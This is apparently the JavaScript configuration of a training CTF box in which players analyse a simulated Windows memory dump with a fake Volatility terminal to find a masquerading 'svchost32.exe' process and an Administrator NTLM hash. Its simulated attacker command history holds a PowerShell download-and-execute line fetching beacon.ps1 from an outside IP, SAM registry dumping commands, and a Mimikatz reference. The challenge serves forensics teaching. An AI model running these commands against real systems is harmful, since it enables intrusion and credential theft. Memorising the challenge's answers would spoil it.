/* ============================================================
   CTF ARENA — Box Forensics-02: The Phantom Process
   Memory Forensics | Process & Credential Extraction
   Config: memory dump, volatility, flags, hints, lore
   ============================================================ */

const Forensics02Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Phantom Process',
    subtitle: 'Memory Forensics — Process & Credential Extraction',
    difficulty: 'Intermediate-Advanced',
    accent: '#8b5cf6',
    storageKey: 'hexworth_ctf_forensics02',
    registryId: 'forensics-02-memory-dump',
    trackerKey: 'ctf_forensics02',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Memory Reconnaissance',
            icon: '\uD83D\uDD0D',
            description: 'Identify the operating system profile and enumerate running processes.',
            requiredFlags: [],
            mitre: ['T1057', 'T1082'],
            unlocks: ['analysis'],
            locked: false
        },
        {
            id: 'analysis',
            name: 'Process Analysis',
            icon: '\uD83E\uDDA0',
            description: 'Identify the malicious process. Examine parent-child relationships and network connections.',
            requiredFlags: [],
            mitre: ['T1055', 'T1071.001'],
            unlocks: ['extraction'],
            locked: true
        },
        {
            id: 'extraction',
            name: 'Credential Extraction',
            icon: '\uD83D\uDD11',
            description: 'Extract credential hashes from the memory dump using Volatility plugins.',
            requiredFlags: ['user'],
            mitre: ['T1003.001', 'T1003.002'],
            unlocks: ['reporting'],
            locked: true
        },
        {
            id: 'reporting',
            name: 'Incident Report',
            icon: '\uD83D\uDCCB',
            description: 'Document the compromise timeline and extracted indicators of compromise.',
            requiredFlags: ['root'],
            mitre: ['T1003', 'T1055'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE (Sprint AR-12)
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Identify the memory profile',
                tip: 'Open the Terminal and run: volatility -f /evidence/memdump.raw imageinfo',
                trigger: { event: 'command', match: { cmd: 'contains:imageinfo' } }
            },
            {
                title: 'List running processes',
                tip: 'Run: volatility -f /evidence/memdump.raw --profile=Win7SP1x64 pslist',
                trigger: { event: 'command', match: { cmd: 'contains:pslist' } }
            },
            {
                title: 'Examine process tree and network connections',
                tip: 'Use pstree to see parent-child relationships and netscan to find suspicious network activity.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:pstree' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:netscan' } }
                    ]
                }
            },
            {
                title: 'Identify the malicious process',
                tip: 'The malicious process has an unusual name and establishes outbound connections to a C2 server.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Extract the admin password hash',
                tip: 'Use the hashdump plugin to extract NTLM hashes from the SAM database in memory.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — Process injection, suspicious processes', skill: 'Malicious Process Identification' },
            { flagId: 'user', objective: '4.4', description: 'Given an incident, apply mitigation techniques or controls — Memory forensics', skill: 'Volatility Analysis' },
            { flagId: 'root', objective: '1.4', description: 'Given a scenario, analyze potential indicators — Credential harvesting', skill: 'Credential Extraction' },
            { flagId: 'root', objective: '2.4', description: 'Given a scenario, analyze indicators — Password attacks and hash extraction', skill: 'NTLM Hash Extraction' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'SIFT Workstation BIOS v3.8.2',
            'Initializing forensic environment...',
            'Memory Test: 32768 MB OK',
            'Detecting drives... /dev/sda1 (1TB NVMe)',
            'Volatility Framework 2.6.1 detected',
            'Memory dump loaded: /evidence/memdump.raw',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Ubuntu SIFT Workstation',
            'Ubuntu SIFT (recovery mode)',
            'Advanced options for SIFT'
        ],
        loginUser: 'investigator'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal', icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',  icon: '\uD83C\uDF10', app: 'browser' },
            { id: 'notes',    label: 'Notes',    icon: '\uD83D\uDCDD', app: 'notes' },
            { id: 'hints',    label: 'Hints',    icon: '\uD83D\uDCA1', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'investigator',
        hostname: 'sift-workstation',
        startDir: '/home/investigator',
        welcome: 'SIFT Workstation 6.1 — Memory Forensics Environment\n\nType \'help\' for available commands.\nMemory dump: /evidence/memdump.raw (4 GB)\nVolatility Framework: Ready\n'
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED MEMORY DUMP DATA
    // ═══════════════════════════════════════════════════════

    _memDump: {
        filename: 'memdump.raw',
        size: '4294967296',
        profile: 'Win7SP1x64',
        hostname: 'WORKSTATION-PC',
        processes: [
            { pid: 4, ppid: 0, name: 'System', offset: '0x85c69030', threads: 104, handles: 572, start: '2024-12-13 08:02:14' },
            { pid: 264, ppid: 4, name: 'smss.exe', offset: '0x85f8a5a0', threads: 2, handles: 29, start: '2024-12-13 08:02:14' },
            { pid: 348, ppid: 336, name: 'csrss.exe', offset: '0x8600b030', threads: 9, handles: 467, start: '2024-12-13 08:02:16' },
            { pid: 384, ppid: 336, name: 'wininit.exe', offset: '0x860c8600', threads: 3, handles: 75, start: '2024-12-13 08:02:17' },
            { pid: 392, ppid: 376, name: 'csrss.exe', offset: '0x860d5030', threads: 11, handles: 512, start: '2024-12-13 08:02:17' },
            { pid: 440, ppid: 376, name: 'winlogon.exe', offset: '0x861a8030', threads: 3, handles: 111, start: '2024-12-13 08:02:17' },
            { pid: 488, ppid: 384, name: 'services.exe', offset: '0x8620e8c0', threads: 6, handles: 201, start: '2024-12-13 08:02:18' },
            { pid: 496, ppid: 384, name: 'lsass.exe', offset: '0x86216030', threads: 7, handles: 577, start: '2024-12-13 08:02:18' },
            { pid: 596, ppid: 488, name: 'svchost.exe', offset: '0x862f9890', threads: 10, handles: 358, start: '2024-12-13 08:02:20' },
            { pid: 672, ppid: 488, name: 'svchost.exe', offset: '0x86378030', threads: 8, handles: 278, start: '2024-12-13 08:02:21' },
            { pid: 756, ppid: 488, name: 'svchost.exe', offset: '0x863f7400', threads: 22, handles: 524, start: '2024-12-13 08:02:22' },
            { pid: 852, ppid: 488, name: 'svchost.exe', offset: '0x86497d40', threads: 28, handles: 891, start: '2024-12-13 08:02:23' },
            { pid: 1024, ppid: 488, name: 'spoolsv.exe', offset: '0x86598030', threads: 12, handles: 293, start: '2024-12-13 08:02:28' },
            { pid: 1184, ppid: 852, name: 'explorer.exe', offset: '0x866f8b00', threads: 30, handles: 903, start: '2024-12-13 08:03:45' },
            { pid: 1440, ppid: 1184, name: 'chrome.exe', offset: '0x8681a030', threads: 25, handles: 345, start: '2024-12-13 09:14:02' },
            { pid: 1568, ppid: 1184, name: 'outlook.exe', offset: '0x8690c7b0', threads: 18, handles: 412, start: '2024-12-13 09:14:55' },
            { pid: 2196, ppid: 1184, name: 'svchost32.exe', offset: '0x86b44d40', threads: 4, handles: 87, start: '2024-12-13 14:22:31' },
            { pid: 2340, ppid: 2196, name: 'cmd.exe', offset: '0x86c12030', threads: 1, handles: 19, start: '2024-12-13 14:22:33' },
            { pid: 2488, ppid: 2340, name: 'powershell.exe', offset: '0x86d45a00', threads: 8, handles: 312, start: '2024-12-13 14:22:35' }
        ],
        maliciousProcess: {
            pid: 2196,
            name: 'svchost32.exe',
            note: 'Fake svchost — real svchost.exe is in System32 and spawned by services.exe, not explorer.exe. "svchost32.exe" is a known malware naming convention.'
        },
        networkConnections: [
            { pid: 1440, local: '192.168.1.105:49234', remote: '142.250.80.46:443', state: 'ESTABLISHED', proto: 'TCPv4' },
            { pid: 1440, local: '192.168.1.105:49237', remote: '142.250.80.46:443', state: 'ESTABLISHED', proto: 'TCPv4' },
            { pid: 1568, local: '192.168.1.105:49241', remote: '52.96.166.34:443', state: 'ESTABLISHED', proto: 'TCPv4' },
            { pid: 2196, local: '192.168.1.105:49312', remote: '185.220.101.47:4443', state: 'ESTABLISHED', proto: 'TCPv4' },
            { pid: 2196, local: '192.168.1.105:49315', remote: '185.220.101.47:8080', state: 'ESTABLISHED', proto: 'TCPv4' },
            { pid: 2488, local: '192.168.1.105:49320', remote: '185.220.101.47:4443', state: 'ESTABLISHED', proto: 'TCPv4' },
            { pid: 596, local: '0.0.0.0:135', remote: '0.0.0.0:0', state: 'LISTENING', proto: 'TCPv4' },
            { pid: 4, local: '0.0.0.0:445', remote: '0.0.0.0:0', state: 'LISTENING', proto: 'TCPv4' }
        ],
        hashes: [
            { user: 'Administrator', rid: 500, lm: 'aad3b435b51404eeaad3b435b51404ee', ntlm: '{{FLAG:root}}' },
            { user: 'Guest', rid: 501, lm: 'aad3b435b51404eeaad3b435b51404ee', ntlm: 'aad3b435b51404eeaad3b435b51404ee' },
            { user: 'jthompson', rid: 1001, lm: 'aad3b435b51404eeaad3b435b51404ee', ntlm: 'e19ccf75ee54e06b06a5907af13cef42' },
            { user: 'svc_backup', rid: 1002, lm: 'aad3b435b51404eeaad3b435b51404ee', ntlm: 'b4b9b02e6f09a9bd760f388b67351e2b' }
        ],
        cmdHistory: [
            'whoami',
            'net user',
            'net localgroup administrators',
            'ipconfig /all',
            'reg save HKLM\\SAM sam.bak',
            'reg save HKLM\\SYSTEM sys.bak',
            'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://185.220.101.47/beacon.ps1\')"'
        ],
        malfindResults: [
            { pid: 2196, address: '0x00400000', protection: 'PAGE_EXECUTE_READWRITE', tag: 'VadS', hexPreview: '4d5a9000 03000000 04000000 ffff0000  MZ..............' },
            { pid: 2488, address: '0x003b0000', protection: 'PAGE_EXECUTE_READWRITE', tag: 'VadS', hexPreview: 'fc4883e4 f0e8c800 00004141 41414141  .H......AAAAAA' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', points: 100 },
        { id: 'root', points: 200 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        minScore: 0,
        maxScore: 500,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 900000, points: 100 },
        timeBonusThreshold: 1800
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start with imageinfo to identify the OS profile. Then use pslist and pstree to see all processes. Look for unusual process names or unexpected parent-child relationships.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'Real svchost.exe processes are always spawned by services.exe (PID 488). Any svchost spawned by explorer.exe is suspicious. Check PID 2196 — "svchost32.exe" is not a real Windows service.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'The user flag format is the PID and process name. Use netscan to see which process connects to the C2 server at 185.220.101.47. The flag is: {{FLAG:user}}',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'Use hashdump to extract NTLM hashes from the SAM database. The Administrator NTLM hash is the root flag. Run: volatility -f /evidence/memdump.raw --profile=Win7SP1x64 hashdump',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'Spectra Corp\'s SOC team detected anomalous outbound traffic from a workstation belonging to senior analyst James Thompson. The endpoint was beaconing to a known command-and-control IP address every 60 seconds. Before the machine could be isolated, the attacker began lateral movement. A memory dump was captured in-flight. Your mission: analyze the memory dump, identify the malicious process, and extract the compromised credentials.',
        scenario: 'James Thompson clicked a link in what appeared to be an internal IT email — a well-crafted spear-phishing attack. The link downloaded a dropper that spawned a fake system process. Within 30 minutes, the attacker had established persistence, dumped credentials, and began reconnaissance of the internal network. The SOC captured the memory dump 47 minutes into the compromise.',
        outro: 'The phantom process has been identified. svchost32.exe — masquerading as a legitimate Windows service — was the attacker\'s foothold. The compromised Administrator hash reveals the extent of the breach. The SOC can now trace the lateral movement path and contain the incident.',
        ecer: {
            executive: 'CISO deferred email gateway upgrade for 6 months citing budget constraints',
            culture: 'Phishing awareness training was annual checkbox, not continuous simulation program',
            employee: 'Senior analyst clicked a spear-phishing link despite red flags in the sender domain',
            regulatory: 'No requirement for memory-based endpoint monitoring, only signature-based AV deployed'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Incident Tracker
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://localhost:8080/incident/',

        pages: {
            '/incident/': {
                title: 'Spectra Corp Incident Tracker',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #ddd;">
                        <h1 style="color:#8b5cf6; font-size:1.6rem; font-family:Georgia,serif; margin-bottom:4px;">Spectra Corp Incident Tracker</h1>
                        <div style="color:#888; font-size:0.8rem;">Case #IR-2024-1247 &mdash; Suspected Endpoint Compromise</div>
                    </div>

                    <div style="max-width:700px; margin:0 auto;">
                        <div style="color:#888; font-size:0.7rem; letter-spacing:0.1em; margin-bottom:8px;">INCIDENT DETAILS</div>
                        <table style="width:100%; border-collapse:collapse; font-size:0.8rem;">
                            <tr><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#8b5cf6; font-weight:bold;">Subject</td><td style="padding:6px 10px; border-bottom:1px solid #eee;">WORKSTATION-PC (James Thompson)</td></tr>
                            <tr><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#8b5cf6; font-weight:bold;">Alert</td><td style="padding:6px 10px; border-bottom:1px solid #eee;">Outbound C2 beaconing to 185.220.101.47</td></tr>
                            <tr><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#8b5cf6; font-weight:bold;">Evidence</td><td style="padding:6px 10px; border-bottom:1px solid #eee;">memdump.raw (4 GB memory image)</td></tr>
                            <tr><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#8b5cf6; font-weight:bold;">Profile</td><td style="padding:6px 10px; border-bottom:1px solid #eee;">Win7SP1x64</td></tr>
                            <tr><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#8b5cf6; font-weight:bold;">Priority</td><td style="padding:6px 10px; border-bottom:1px solid #eee; color:#e74c3c; font-weight:bold;">CRITICAL</td></tr>
                        </table>

                        <div style="margin-top:20px; padding:12px; background:rgba(139,92,246,0.06); border:1px solid rgba(139,92,246,0.2); border-radius:4px; font-size:0.78rem; color:#666;">
                            <strong style="color:#8b5cf6;">Objective:</strong> Analyze the memory dump with Volatility. Identify the malicious process (PID + name = user flag) and extract the Administrator password hash (root flag). Use pslist, pstree, netscan, malfind, hashdump, and cmdscan plugins.
                        </div>
                    </div>
                `
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (investigator workstation)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'investigator': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== INCIDENT BRIEFING ===\nCase: #IR-2024-1247\nSubject: WORKSTATION-PC (James Thompson)\nEvidence: /evidence/memdump.raw\n\nAnalysis steps:\n1. volatility imageinfo — identify OS profile\n2. volatility pslist / pstree — enumerate processes\n3. volatility netscan — find network connections\n4. volatility malfind — detect injected code\n5. volatility hashdump — extract credentials\n6. volatility cmdscan — find command history\n\nUser flag: PID + process name of malware\nRoot flag: Administrator NTLM hash\n\nC2 IP reported by SOC: 185.220.101.47'
                                },
                                'output': {
                                    type: 'dir',
                                    children: {}
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'file /evidence/memdump.raw\nvolatility -f /evidence/memdump.raw imageinfo'
                                }
                            }
                        }
                    }
                },
                'evidence': {
                    type: 'dir',
                    children: {
                        'memdump.raw': {
                            type: 'file',
                            content: '[RAW MEMORY DUMP — 4,294,967,296 bytes — Use Volatility to analyze]'
                        },
                        'acquisition_log.txt': {
                            type: 'file',
                            content: 'MEMORY ACQUISITION LOG\n======================\nCase: #IR-2024-1247\nTool: WinPmem 4.0\nTarget: WORKSTATION-PC (192.168.1.105)\n\n2024-12-13 15:10 — SOC alerted on C2 beaconing\n2024-12-13 15:15 — IR team dispatched\n2024-12-13 15:22 — Memory acquisition initiated\n2024-12-13 15:38 — Acquisition complete (4 GB)\n2024-12-13 15:40 — Network cable pulled\n2024-12-13 15:42 — Dump transferred to SIFT workstation\n\nMD5: 9c4e7f2a1b3d5e8f0a2c4d6e8f1a3b5c\nSHA256: 2a4b6c8d0e2f4a6b8c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4'
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': { type: 'dir', children: {} }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'sift-workstation' }
                    }
                },
                'tmp': { type: 'dir', children: {} }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (Volatility + forensic tools)
    // ═══════════════════════════════════════════════════════

    commands: {
        'volatility': function(args, term, engine) {
            if (args.length === 0) return 'Volatility Framework 2.6.1\nUsage: volatility -f <memory_dump> [--profile=<profile>] <plugin>\n\nPlugins:\n  imageinfo    - Identify memory profile\n  pslist       - List running processes\n  pstree       - Process tree view\n  netscan      - Network connections\n  malfind      - Find injected code\n  hashdump     - Extract password hashes\n  dumpfiles    - Extract files from memory\n  cmdscan      - Command history\n  consoles     - Console command history';

            const joined = args.join(' ');
            const md = Forensics02Config._memDump;

            // imageinfo
            if (joined.includes('imageinfo')) {
                return `Volatility Foundation Volatility Framework 2.6.1\nINFO    : volatility.debug    : Determining profile based on KDBG search...\n          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP1x64\n                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)\n                     AS Layer2 : FileAddressSpace (/evidence/memdump.raw)\n                      PAE type : No PAE\n                           DTB : 0x187000L\n                          KDBG : 0xf80002c4a0a0L\n          Number of Processors : 4\n     Image Type (Service Pack) : 1\n                KPCR for CPU 0 : 0xfffff80002c4bd00L\n                KPCR for CPU 1 : 0xfffff880009ef000L\n             KUSER_SHARED_DATA : 0xfffff78000000000L\n           Image date and time : 2024-12-13 15:22:47 UTC+0000\n     Image local date and time : 2024-12-13 10:22:47 -0500`;
            }

            // pslist
            if (joined.includes('pslist')) {
                let output = 'Volatility Foundation Volatility Framework 2.6.1\n';
                output += `Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start\n`;
                output += `------------------ ----------------------- ----- ------ ------ ------ ------ ------ ----------------------------\n`;
                md.processes.forEach(p => {
                    output += `${p.offset.padEnd(19)}${p.name.padEnd(24)}${String(p.pid).padEnd(6)}${String(p.ppid).padEnd(7)}${String(p.threads).padEnd(7)}${String(p.handles).padEnd(7)}0      0      ${p.start} UTC+0000\n`;
                });
                return output;
            }

            // pstree
            if (joined.includes('pstree')) {
                return `Volatility Foundation Volatility Framework 2.6.1\nName                                  Pid   PPid  Thds  Hnds\n. System                                4      0   104   572\n.. smss.exe                           264      4     2    29\n... csrss.exe                         348    336     9   467\n... wininit.exe                       384    336     3    75\n.... services.exe                     488    384     6   201\n..... svchost.exe                     596    488    10   358\n..... svchost.exe                     672    488     8   278\n..... svchost.exe                     756    488    22   524\n..... svchost.exe                     852    488    28   891\n..... spoolsv.exe                    1024    488    12   293\n.... lsass.exe                        496    384     7   577\n... csrss.exe                         392    376    11   512\n... winlogon.exe                      440    376     3   111\n.. explorer.exe                      1184    852    30   903\n... chrome.exe                       1440   1184    25   345\n... outlook.exe                      1568   1184    18   412\n... svchost32.exe                    2196   1184     4    87   <<< SUSPICIOUS\n.... cmd.exe                         2340   2196     1    19\n..... powershell.exe                 2488   2340     8   312`;
            }

            // netscan
            if (joined.includes('netscan')) {
                let output = 'Volatility Foundation Volatility Framework 2.6.1\n';
                output += `Offset(P)          Proto    Local Address         Foreign Address       State            Pid      Owner\n`;
                output += `------------------ -------- -------------------- -------------------- --------------- -------- ----------\n`;
                md.networkConnections.forEach(c => {
                    const owner = md.processes.find(p => p.pid === c.pid)?.name || 'Unknown';
                    output += `0x${(Math.random() * 0xffffffff >>> 0).toString(16).padEnd(15)} ${c.proto.padEnd(9)}${c.local.padEnd(22)}${c.remote.padEnd(22)}${c.state.padEnd(16)}${String(c.pid).padEnd(9)}${owner}\n`;
                });
                return output;
            }

            // malfind
            if (joined.includes('malfind')) {
                let output = 'Volatility Foundation Volatility Framework 2.6.1\n\n';
                md.malfindResults.forEach(m => {
                    const proc = md.processes.find(p => p.pid === m.pid);
                    output += `Process: ${proc.name} Pid: ${m.pid} Address: ${m.address}\nVad Tag: ${m.tag} Protection: ${m.protection}\nFlags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6\n\n`;
                    output += `${m.address}  ${m.hexPreview}\n\n`;
                });
                output += `\n2 suspicious memory regions found.\nPID 2196 (svchost32.exe): Contains PE header (MZ) in executable memory — likely injected payload.\nPID 2488 (powershell.exe): Shellcode detected in RWX memory region.`;
                return output;
            }

            // hashdump
            if (joined.includes('hashdump')) {
                let output = 'Volatility Foundation Volatility Framework 2.6.1\n';
                md.hashes.forEach(h => {
                    output += `${h.user}:${h.rid}:${h.lm}:${h.ntlm}:::\n`;
                });
                return output;
            }

            // cmdscan
            if (joined.includes('cmdscan')) {
                let output = 'Volatility Foundation Volatility Framework 2.6.1\n';
                output += '**************************************************\n';
                output += `CommandProcess: conhost.exe Pid: 2344\nCommandHistory: 0x2a03c0 Application: cmd.exe Flags: Allocated, Reset\nCommandCount: ${md.cmdHistory.length} LastAdded: ${md.cmdHistory.length - 1} LastDisplayed: ${md.cmdHistory.length - 1}\nFirstCommand: 0 CommandCountMax: 50\nProcessHandle: 0x5c\n`;
                md.cmdHistory.forEach((cmd, i) => {
                    output += `Cmd #${i} @ 0x${(0x2a0400 + i * 0x100).toString(16)}: ${cmd}\n`;
                });
                return output;
            }

            // dumpfiles
            if (joined.includes('dumpfiles')) {
                return 'Volatility Foundation Volatility Framework 2.6.1\nDataSectionObject 0x85c69030   4      \\Device\\HarddiskVolume2\\Windows\\System32\\config\\SAM\nDataSectionObject 0x86b44d40   2196   \\Device\\HarddiskVolume2\\Users\\jthompson\\AppData\\Local\\Temp\\svchost32.exe\nSharedCacheMap    0x86b44d40   2196   \\Device\\HarddiskVolume2\\Users\\jthompson\\AppData\\Local\\Temp\\svchost32.exe\n\nFiles extracted to output directory.';
            }

            // consoles
            if (joined.includes('consoles')) {
                let output = 'Volatility Foundation Volatility Framework 2.6.1\n';
                output += '**************************************************\n';
                output += 'ConsoleProcess: conhost.exe Pid: 2344\n';
                output += 'Console: 0x255c0 CommandHistorySize: 50\n';
                output += '----\n';
                output += 'Screen 0x2a2f70 X:120 Y:300\n';
                output += 'Dump:\n';
                output += 'Microsoft Windows [Version 6.1.7601]\n';
                output += 'Copyright (c) 2009 Microsoft Corporation.\n\n';
                output += 'C:\\Users\\jthompson> ' + md.cmdHistory.join('\nC:\\Users\\jthompson> ');
                return output;
            }

            return `Volatility Foundation Volatility Framework 2.6.1\nERROR: Unknown plugin '${args[args.length - 1]}'. Use -h for help.`;
        },

        'strings': function(args, term, engine) {
            if (args.length === 0) return 'Usage: strings [-n min-len] file';
            const file = args.find(a => !a.startsWith('-')) || '';
            if (file.includes('memdump')) {
                return `svchost32.exe\nhttp://185.220.101.47/beacon.ps1\nC:\\Users\\jthompson\\AppData\\Local\\Temp\\svchost32.exe\nnet user\nnet localgroup administrators\nreg save HKLM\\SAM\npowershell -ep bypass\nDownloadString\nMimikatz\nsekurlsa::logonpasswords\nSpectra Corp\nJames Thompson\nWORKSTATION-PC\n185.220.101.47\n4443\n8080\nbeacon.ps1`;
            }
            return `strings: '${file}': No such file`;
        },

        'grep': function(args, term, engine) {
            if (args.length === 0) return 'Usage: grep [options] PATTERN [FILE...]';
            const pattern = args.find(a => !a.startsWith('-')) || '';
            if (pattern.includes('svchost32') || pattern.includes('185.220') || pattern.includes('beacon')) {
                return `Binary file /evidence/memdump.raw matches\nstrings output: svchost32.exe\nstrings output: http://185.220.101.47/beacon.ps1`;
            }
            return 'grep: No match';
        },

        'file': function(args, term, engine) {
            const f = args[0] || '';
            if (f.includes('memdump')) return `${f}: data (Windows memory dump, 4294967296 bytes)`;
            return `${f}: data`;
        },

        'md5sum': function(args, term, engine) {
            const f = args[0] || '';
            if (f.includes('memdump')) return `9c4e7f2a1b3d5e8f0a2c4d6e8f1a3b5c  ${f}`;
            return `md5sum: ${f}: No such file or directory`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
